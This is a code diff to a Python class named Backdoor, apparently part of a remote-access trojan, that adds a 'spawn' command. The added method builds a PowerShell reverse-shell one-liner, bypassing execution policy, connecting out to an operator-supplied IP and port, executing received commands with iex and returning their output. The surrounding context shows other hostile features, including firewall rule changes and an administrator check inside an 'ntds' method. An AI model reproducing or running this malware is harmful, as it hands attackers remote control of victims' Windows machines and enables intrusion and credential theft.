@@ -169,6 +169,15 @@ class Backdoor:
             return "[-] failed to add firewall rule [-]"
             pass
 
+    def spawn(self,target_ip,target_port):
+        spawner=""" powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
+        try:
+            subprocess.Popen(spawner,shell=True)
+            return "[+] powershell session spawn successfully check your listener [+]"
+        except :
+            return "[-] failed to spawn powershell session [-]"
+
+
     def ntds(self):
         if os_type == 'windows':
             is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
@@ -445,6 +454,8 @@ class Backdoor:
             elif cmd[0] == "cd" and len(cmd) > 1:
                 directory = ' '.join(cmd[1:])
                 result = self.chdir(directory)
+            elif cmd[0] == "spawn":
+                result=self.spawn(cmd[1],cmd[2])
             elif cmd[0] == "enum":
                 if os_type == "linux":
                     self.linux_enum()
